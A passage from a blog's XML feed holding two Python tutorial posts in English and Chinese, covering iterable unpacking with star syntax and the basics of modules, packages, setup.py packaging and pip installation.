        <content type="html"><![CDATA[<p>Unpacking actually works with any object that happens to be iterable,not just <strong>tuples list or lists</strong>. This includes<strong>strings, files, iterators,and generators</strong>.</p><h2 id="basic">Basic</h2><p>在等号左边使用逗号 comma <code>,</code>分隔与右边序列个数相同的变量来接受收他们。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">12</span>]: test_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">In [<span class="number">13</span>]: a,b,c = test_list</span><br><span class="line">In [<span class="number">17</span>]: <span class="built_in">print</span>(a,b,c)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line">In [<span class="number">22</span>]: test_dict=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">18</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">23</span>]: a, b = test_dict</span><br><span class="line"></span><br><span class="line">In [<span class="number">24</span>]: <span class="built_in">print</span>(a,b,sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">name</span><br><span class="line">age</span><br><span class="line"></span><br><span class="line">In [<span class="number">27</span>]: a, b = test_dict.items()</span><br><span class="line">In [<span class="number">28</span>]: a</span><br><span class="line">Out[<span class="number">28</span>]: (<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;zhangsan&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">30</span>]: a, b = test_dict.values()</span><br><span class="line">In [<span class="number">31</span>]: a</span><br><span class="line">Out[<span class="number">31</span>]: <span class="string">&#x27;zhangsan&#x27;</span></span><br></pre></td></tr></table></figure><p>Because <strong>parentheses of tuples can be omitted</strong>,multiple values can be assigned to multiple variables in one line asfollows.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">40</span>]: a, b = <span class="number">3</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">41</span>]: a</span><br><span class="line">Out[<span class="number">41</span>]: <span class="number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">42</span>]: b</span><br><span class="line">Out[<span class="number">42</span>]: <span class="number">4</span></span><br></pre></td></tr></table></figure><p>An error occurs if the number of variables does not match the numberof elements.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">43</span>]: test_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">In [<span class="number">44</span>]: a,b = test_list</span><br><span class="line"> ValueError: too many values to unpack (expected <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">45</span>]: a,b,c,d = test_list</span><br><span class="line"> ValueError: <span class="keyword">not</span> enough values to unpack (expected <span class="number">4</span>, got <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>If the number of variables is less than the number of elements, it ispossible to add an asterisk <code>*</code> to the variable name andassign the remaining elements as a list. This will be describedlater.</p><h2 id="unpack-a-nested-tuple-and-list">Unpack a nested tuple andlist</h2><p>You can also unpack a nested tuple and list. If you want to expandthe inner element, enclose the variable with <code>()</code> or<code>[]</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">47</span>]: test_tuple = (<span class="number">0</span>,<span class="number">1</span>,(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">In [<span class="number">48</span>]: a, b, c = test_tuple</span><br><span class="line"></span><br><span class="line">In [<span class="number">49</span>]: <span class="built_in">print</span>(a,b,c, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">In [<span class="number">51</span>]: a, b, (c, d, e) = test_tuple</span><br><span class="line"></span><br><span class="line">In [<span class="number">52</span>]: <span class="built_in">print</span>(a,b,c,d,e, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><h2 id="unpack-using-_-underscore">Unpack using _ (underscore)</h2><p>By convention, unnecessary values may be assigned to underscores<code>_</code> in Python. It does not have a grammatical specialmeaning, but is simply assigned to a variable named <code>_</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">54</span>]: test = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">55</span>]: a, b, _ = test</span><br><span class="line">In [<span class="number">58</span>]: <span class="built_in">print</span>(a, b, _, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><p><strong>Notice</strong>：variables named <code>_</code> are not meantto be used， I print it here just to help you understand it in moredetail.</p><h2 id="unpack-using-asterisk">Unpack using * (asterisk)</h2><p>If the number of variables is less than the number of elements,adding an asterisk <code>*</code> to the variable name will assign theelements together as a list.</p><p>The elements from the beginning and the end are assigned to variableswithout <code>*</code>, and the remaining elements are assigned as a<strong>list</strong> to variables with <code>*</code>.</p><p>It is implemented in Python 3 and can not be used in Python 2.</p><p>Extended iterable unpacking is tailor-made for unpacking iterablesofunknown or arbitrary length.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">64</span>]: test</span><br><span class="line">Out[<span class="number">64</span>]: [<span class="number">62</span>, <span class="number">83</span>, <span class="number">93</span>, <span class="number">100</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">65</span>]: a, b, *c = test</span><br><span class="line"></span><br><span class="line">In [<span class="number">66</span>]: <span class="built_in">print</span>(a, b, c, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="number">62</span></span><br><span class="line"><span class="number">83</span></span><br><span class="line">[<span class="number">93</span>, <span class="number">100</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">67</span>]: a, *b, c = test</span><br><span class="line"></span><br><span class="line">In [<span class="number">68</span>]: <span class="built_in">print</span>(a, b, c, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="number">62</span></span><br><span class="line">[<span class="number">83</span>, <span class="number">93</span>]</span><br><span class="line"><span class="number">100</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">69</span>]: *a, b, c = test</span><br><span class="line"></span><br><span class="line">In [<span class="number">70</span>]: <span class="built_in">print</span>(a, b, c, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">[<span class="number">62</span>, <span class="number">83</span>]</span><br><span class="line"><span class="number">93</span></span><br><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure><h2 id="usage">Usage</h2><p>Use unpacking When there are only some interesting elements in thespecific positions.</p><ol type="1"><li>when it is desired to assign only the first two elements of a tupleor a list to variables, the underscore _ may be used for unnecessaryparts.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">73</span>]: test</span><br><span class="line">Out[<span class="number">73</span>]: [<span class="number">62</span>, <span class="number">83</span>, <span class="number">93</span>, <span class="number">100</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">74</span>]: a, b, *_ = test</span><br><span class="line"></span><br><span class="line">In [<span class="number">75</span>]: <span class="built_in">print</span>(a, b, _, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="number">62</span></span><br><span class="line"><span class="number">83</span></span><br><span class="line">[<span class="number">93</span>, <span class="number">100</span>]</span><br></pre></td></tr></table></figure><ol start="2" type="1"><li>The star syntax can be especially useful wheniterating over asequence of tuples of varying length</li></ol><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">records = [</span><br><span class="line">    (&#x27;foo&#x27;, 1, 2),</span><br><span class="line">    (&#x27;bar&#x27;, &#x27;hello&#x27;),</span><br><span class="line">    (&#x27;foo&#x27;, 3, 4),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def do_foo(x, y):</span><br><span class="line">    print(&#x27;foo&#x27;, x, y)</span><br><span class="line"></span><br><span class="line">def do_bar(s):</span><br><span class="line">    print(&#x27;bar&#x27;, s)</span><br><span class="line"></span><br><span class="line">for tag, *args in records:</span><br><span class="line">    if tag == &#x27;foo&#x27;:</span><br><span class="line">        do_foo(*args)</span><br><span class="line">    elif tag == &#x27;bar&#x27;:</span><br><span class="line">        do_bar(*args)</span><br></pre></td></tr></table></figure><ol start="3" type="1"><li>Star unpacking can also be useful when combined with certain kindsof string processing operations, such as splitting. For example:</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>line = <span class="string">&#x27;nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>uname, *fields, homedir, sh = line.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>uname</span><br><span class="line"><span class="string">&#x27;nobody&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>homedir</span><br><span class="line"><span class="string">&#x27;/var/empty&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sh</span><br><span class="line"><span class="string">&#x27;/usr/bin/false&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>Notice:</p><ol type="1"><li><p>You can add <code>*</code> to only one variable.</p><p>If there are multiple variables with <code>*</code>, it can not bedetermined how many elements are to be assigned, so<code>SyntaxError</code> occurs.</p></li><li><p>Assigned as a list Even if there is only one element assigned toa variable with *, it is assigned as a list. If there are no extraelements, an empty list is assigned.</p></li><li><p>It is also an error to use the starred expression as a loneassignment target, as in <code>*a = range(5)</code> This, however, isvalid syntax: <code>*a, = range(5)</code></p></li><li><p>this proposal also applies to tuples in implicit assignmentcontext, such as in a fortatement:</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> a, *b <span class="keyword">in</span> [(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), (<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>)]:</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print out</span></span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure><ol start="5" type="1"><li>Starred expressions are <strong>only allowed as assignmenttargets</strong>, using them anywhere else (except for star-args infunction calls, of course) is an error.</li></ol><h2 id="iterable">iterable</h2><p>If the right-hand value is not a list, but an iterable, it has to beconverted to a list before being able to do slicing; to avoid creatingthis temporary list, one has to resort to</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">it = <span class="built_in">iter</span>(seq)</span><br><span class="line">first = it.<span class="built_in">next</span>()</span><br><span class="line">rest = <span class="built_in">list</span>(it)</span><br></pre></td></tr></table></figure><h2 id="multiple-function-arguments">Multiple Function Arguments</h2><p>Just mention it:</p><p>python 中有两种多值参数： 参数名前增加一个 <code>*</code>可以接收元组, <code>*args</code> 参数名前增加两个 <code>*</code>可以接收字典, <code>**kwargs</code></p><p>参考推荐: <a href="https://www.python.org/dev/peps/pep-3132/">PEP3132 -- Extended Iterable Unpacking</a> <ahref="https://note.nkmk.me/en/python-tuple-list-unpack/">Unpack a tuple/ list in Python</a> <ahref="https://zhuanlan.zhihu.com/p/33896402">python 有趣的解包用法</a><ahref="https://learning.oreilly.com/library/view/python-cookbook-3rd/9781449357337/">PythonCookbook 3rd Edition</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python module and package</title>
      <link href="/blog/2020/03/22/programming/python/1.basic/10.module_and_packages/"/>
      <url>/blog/2020/03/22/programming/python/1.basic/10.module_and_packages/</url>
      
        <content type="html"><![CDATA[<h1 id="模块和包">模块和包</h1><h2 id="目标">目标</h2><ul><li>模块</li><li>包</li><li>发布模块</li></ul><h2 id="模块">01. 模块</h2><h3 id="模块的概念">1.1 模块的概念</h3><blockquote><p><strong>模块是 Python 程序架构的一个核心概念</strong></p></blockquote><ul><li>每一个以扩展名 <code>py</code> 结尾的 <code>Python</code>源代码文件都是一个 <strong>模块</strong></li><li><strong>模块名</strong> 同样也是一个<strong>标识符</strong>，需要符合标识符的命名规则</li><li>在模块中定义的 <strong>全局变量</strong>、<strong>函数</strong>、<strong>类</strong> 都是提供给外界直接使用的<strong>工具</strong></li><li><strong>模块</strong> 就好比是<strong>工具包</strong>，要想使用这个工具包中的工具，就需要先<strong>导入</strong> 这个模块</li></ul><h3 id="模块的两种导入方式">1.2 模块的两种导入方式</h3><h4 id="import-导入">1）import 导入</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 模块名<span class="number">1</span>, 模块名<span class="number">2</span></span><br></pre></td></tr></table></figure><blockquote><p>提示：在导入模块时，每个导入应该独占一行</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 模块名<span class="number">1</span></span><br><span class="line"><span class="keyword">import</span> 模块名<span class="number">2</span></span><br></pre></td></tr></table></figure><ul><li>导入之后<ul><li>通过 <code>模块名.</code> 使用 <strong>模块提供的工具</strong> ——<strong>全局变量</strong>、<strong>函数</strong>、<strong>类</strong></li></ul></li></ul><h5 id="使用-as-指定模块的别名">使用 <code>as</code> 指定模块的别名</h5><blockquote><p><strong>如果模块的名字太长</strong>，可以使用 <code>as</code>指定模块的名称，以方便在代码中的使用</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 模块名<span class="number">1</span> <span class="keyword">as</span> 模块别名</span><br></pre></td></tr></table></figure><blockquote><p>注意：<strong>模块别名</strong> 应该符合<strong>大驼峰命名法</strong></p></blockquote><h4 id="from...import-导入">2）from...import 导入</h4><ul><li>如果希望 <strong>从某一个模块</strong> 中，导入<strong>部分</strong> 工具，就可以使用 <code>from ... import</code>的方式</li><li><code>import 模块名</code> 是 <strong>一次性</strong> 把模块中<strong>所有工具全部导入</strong>，并且通过 <strong>模块名/别名</strong>访问</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从 模块 导入 某一个工具</span></span><br><span class="line"><span class="keyword">from</span> 模块名<span class="number">1</span> <span class="keyword">import</span> 工具名</span><br></pre></td></tr></table></figure><ul><li>导入之后<ul><li><strong>不需要</strong> 通过 <code>模块名.</code></li><li>可以直接使用 <strong>模块提供的工具</strong> ——<strong>全局变量</strong>、<strong>函数</strong>、<strong>类</strong></li></ul></li></ul><p><strong>注意</strong></p><blockquote><p>如果 <strong>两个模块</strong>，存在<strong>同名的函数</strong>，那么 <strong>后导入模块的函数</strong>，会<strong>覆盖掉先导入的函数</strong></p></blockquote><ul><li>开发时 <code>import</code> 代码应该统一写在<strong>代码的顶部</strong>，更容易及时发现冲突</li><li>一旦发现冲突，可以使用 <code>as</code> 关键字<strong>给其中一个工具起一个别名</strong></li></ul><h5 id="from...import-知道">from...import *（知道）</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从 模块 导入 所有工具</span></span><br><span class="line"><span class="keyword">from</span> 模块名<span class="number">1</span> <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><blockquote><p>这种方式不推荐使用，因为函数重名并没有任何的提示，出现问题不好排查</p></blockquote><h3 id="模块的搜索顺序扩展">1.3 模块的搜索顺序[扩展]</h3><p><code>Python</code> 的解释器在 <strong>导入模块</strong> 时，会：</p><ol type="1"><li>搜索 <strong>当前目录</strong>指定模块名的文件，<strong>如果有就直接导入</strong></li><li>如果没有，再搜索 <strong>系统目录</strong></li></ol><blockquote><p>在开发时，给文件起名，不要和 <strong>系统的模块文件</strong><strong>重名</strong></p></blockquote><p><code>Python</code> 中每一个模块都有一个内置属性<code>__file__</code> 可以 <strong>查看模块</strong> 的<strong>完整路径</strong></p><p><strong>示例</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个 0～10 的数字</span></span><br><span class="line">rand = random.randint(<span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rand)</span><br></pre></td></tr></table></figure><blockquote><p>注意：如果当前目录下，存在一个 <code>random.py</code>的文件，程序就无法正常执行了！</p></blockquote><ul><li>这个时候，<code>Python</code> 的解释器会<strong>加载当前目录</strong> 下的 <code>random.py</code> 而不会加载<strong>系统的</strong> <code>random</code> 模块</li></ul><h3 id="原则-每一个文件都应该是可以被导入的">1.4 原则 ——每一个文件都应该是可以被导入的</h3><ul><li>一个 <strong>独立的 <code>Python</code> 文件</strong> 就是一个<strong>模块</strong></li><li>在导入文件时，文件中 <strong>所有没有任何缩进的代码</strong>都会被执行一遍！</li></ul><p><strong>实际开发场景</strong></p><ul><li>在实际开发中，每一个模块都是独立开发的，大多都有专人负责</li><li>开发人员通常会在模块下方增加一些测试代码<ul><li>仅在模块内使用，而被导入到其他文件中不需要执行</li></ul></li></ul><h4 id="name__-属性"><code>__name__</code> 属性</h4><blockquote><ul><li><code>__name__</code> 属性可以做到，测试模块的代码<strong>只在测试情况下被运行</strong>，而在<strong>被导入时不会被执行</strong>！</li></ul></blockquote><ul><li><code>__name__</code> 是 <code>Python</code>的一个内置属性，记录着一个 <strong>字符串</strong></li><li>如果 <strong>是被其他文件导入的</strong>，<code>__name__</code> 就是<strong>模块名</strong></li><li>如果 <strong>是当前执行的程序</strong> <code>__name__</code> 是<strong><code>__main__</code></strong></li></ul><p><strong>在很多 <code>Python</code>文件中都会看到以下格式的代码</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="comment"># 定义全局变量</span></span><br><span class="line"><span class="comment"># 定义类</span></span><br><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在代码的最下方</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据 __name__ 判断是否执行下方代码</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="包package">02. 包（Package）</h2><h3 id="概念">概念</h3><ul><li><strong>包</strong> 是一个 <strong>包含多个模块</strong> 的<strong>特殊目录</strong></li><li>目录下有一个 <strong>特殊的文件</strong><code>__init__.py</code></li><li>包名的 <strong>命名方式</strong>和变量名一致，<strong>小写字母</strong> + <code>_</code></li></ul><p><strong>好处</strong></p><ul><li>使用 <code>import 包名</code> 可以一次性导入 <strong>包</strong> 中<strong>所有的模块</strong></li></ul><h3 id="案例演练">案例演练</h3><ol type="1"><li>新建一个 <code>hm_message</code> 的 <strong>包</strong></li><li>在目录下，新建两个文件 <code>send_message</code> 和<code>receive_message</code></li><li>在 <code>send_message</code> 文件中定义一个 <code>send</code>函数</li><li>在 <code>receive_message</code> 文件中定义一个 <code>receive</code>函数</li><li>在外部直接导入 <code>hm_message</code> 的包</li></ol><h3 id="init__.py"><code>__init__.py</code></h3><ul><li>要在外界使用 <strong>包</strong> 中的模块，需要在<code>__init__.py</code> 中指定<strong>对外界提供的模块列表</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从 当前目录 导入 模块列表</span></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> send_message</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> receive_message</span><br></pre></td></tr></table></figure><h2 id="发布模块知道">03. 发布模块（知道）</h2><ul><li>如果希望自己开发的模块，<strong>分享</strong>给其他人，可以按照以下步骤操作</li></ul><h3 id="制作发布压缩包步骤">3.1 制作发布压缩包步骤</h3><h4 id="创建-setup.py">1) 创建 setup.py</h4><ul><li><code>setup.py</code> 的文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> distutils.core <span class="keyword">import</span> setup</span><br><span class="line"></span><br><span class="line">setup(name=<span class="string">&quot;hm_message&quot;</span>,  <span class="comment"># 包名</span></span><br><span class="line">      version=<span class="string">&quot;1.0&quot;</span>,  <span class="comment"># 版本</span></span><br><span class="line">      description=<span class="string">&quot;itheima&#x27;s 发送和接收消息模块&quot;</span>,  <span class="comment"># 描述信息</span></span><br><span class="line">      long_description=<span class="string">&quot;完整的发送和接收消息模块&quot;</span>,  <span class="comment"># 完整描述信息</span></span><br><span class="line">      author=<span class="string">&quot;itheima&quot;</span>,  <span class="comment"># 作者</span></span><br><span class="line">      author_email=<span class="string">&quot;itheima@itheima.com&quot;</span>,  <span class="comment"># 作者邮箱</span></span><br><span class="line">      url=<span class="string">&quot;www.itheima.com&quot;</span>,  <span class="comment"># 主页</span></span><br><span class="line">      py_modules=[<span class="string">&quot;hm_message.send_message&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;hm_message.receive_message&quot;</span>])</span><br></pre></td></tr></table></figure><p>有关字典参数的详细信息，可以参阅官方网站：</p><p>https://docs.python.org/2/distutils/apiref.html</p><h4 id="构建模块">2) 构建模块</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 setup.py build</span><br></pre></td></tr></table></figure><h4 id="生成发布压缩包">3) 生成发布压缩包</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 setup.py sdist</span><br></pre></td></tr></table></figure><blockquote><p>注意：要制作哪个版本的模块，就使用哪个版本的解释器执行！</p></blockquote><h3 id="安装模块">3.2 安装模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zxvf hm_message-1.0.tar.gz</span><br><span class="line"></span><br><span class="line">$ sudo python3 setup.py install</span><br></pre></td></tr></table></figure><p><strong>卸载模块</strong></p><p>直接从安装目录下，把安装模块的 <strong>目录</strong> 删除就可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先导入包，使用 __file__属性查看包的路径</span></span><br><span class="line">例如：</span><br><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: re.__file__</span><br><span class="line">Out[<span class="number">2</span>]: <span class="string">&#x27;/usr/local/Cellar/python/3.7.5/Frameworks/Python.framework/Versions/3.7/lib/python3.7/re.py&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后切换到对应目录下，删除对应包的相关信息即可</span></span><br><span class="line">$ cd /usr/local/lib/python3<span class="number">.5</span>/dist-packages/</span><br><span class="line">$ sudo rm -r hm_message*</span><br></pre></td></tr></table></figure><h3 id="pip-安装第三方模块">3.3 <code>pip</code> 安装第三方模块</h3><ul><li><p>第三方模块</p><p>通常是指由知名的第三方团队开发的并且被程序员广泛使用的 Python 包 /模块</p><ul><li>例如 <code>pygame</code> 就是一套非常成熟的<strong>游戏开发模块</strong></li></ul></li><li><p><code>pip</code> 是一个现代的，通用的 <code>Python</code>包管理工具</p></li><li><p>提供了对 <code>Python</code>包的查找、下载、安装、卸载等功能</p></li></ul><p>安装和卸载命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将模块安装到 Python 2.x 环境</span></span><br><span class="line">$ sudo pip install pygame</span><br><span class="line">$ sudo pip uninstall pygame</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将模块安装到 Python 3.x 环境</span></span><br><span class="line">$ sudo pip3 install pygame</span><br><span class="line">$ sudo pip3 uninstall pygame</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python useful modules</title>
      <link href="/blog/2020/03/22/programming/python/1.basic/11.modules/"/>
      <url>/blog/2020/03/22/programming/python/1.basic/11.modules/</url>
      
